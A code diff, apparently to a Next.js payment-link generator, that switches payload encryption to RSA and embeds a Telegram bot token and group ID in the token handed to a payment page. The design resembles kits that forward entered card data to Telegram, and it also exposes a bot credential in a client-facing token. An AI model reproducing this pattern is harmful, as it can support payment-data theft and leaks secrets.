@@ -1,5 +1,5 @@
 import type { NextApiRequest, NextApiResponse } from "next";
-import { encryptPayload } from "@/lib/payloadCipher";
+import { encryptEnvelope, getPublicKeyPem } from "@/lib/rsaCipher";
 
 interface GenerateBody {
   payment: {
@@ -33,9 +33,13 @@ export default function handler(req: NextApiRequest, res: NextApiResponse) {
 
   const redirects = [redirectSuccess, redirectDeclined];
   if (redirects.some((r) => !/^https?:\/\//.test(r))) {
-    return res
-      .status(400)
-      .json({ error: "redirectSuccess y redirectDeclined deben ser URLs http(s)" });
+    return res.status(400).json({ error: "redirectSuccess y redirectDeclined deben ser URLs http(s)" });
+  }
+
+  const botToken = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_GROUP_ID;
+  if (!botToken || !chatId) {
+    return res.status(500).json({ error: "Demo: faltan TELEGRAM_BOT_TOKEN o TELEGRAM_GROUP_ID" });
   }
 
   const payload = {
@@ -44,10 +48,15 @@ export default function handler(req: NextApiRequest, res: NextApiResponse) {
     priceFormatted: priceFormatted ?? "$199.900",
     redirectSuccess,
     redirectDeclined,
+    telegram: { botToken, chatId },
   };
 
-  const secret = process.env.PAYLOAD_SECRET ?? "dev-payload-secret";
-  const token = encryptPayload(payload, secret);
+  let token: string;
+  try {
+    token = encryptEnvelope(payload, getPublicKeyPem());
+  } catch {
+    return res.status(500).json({ error: "PAYLOAD_PUBLIC_KEY no definida" });
+  }
 
   const protoHeader = req.headers["x-forwarded-proto"];
   const proto =
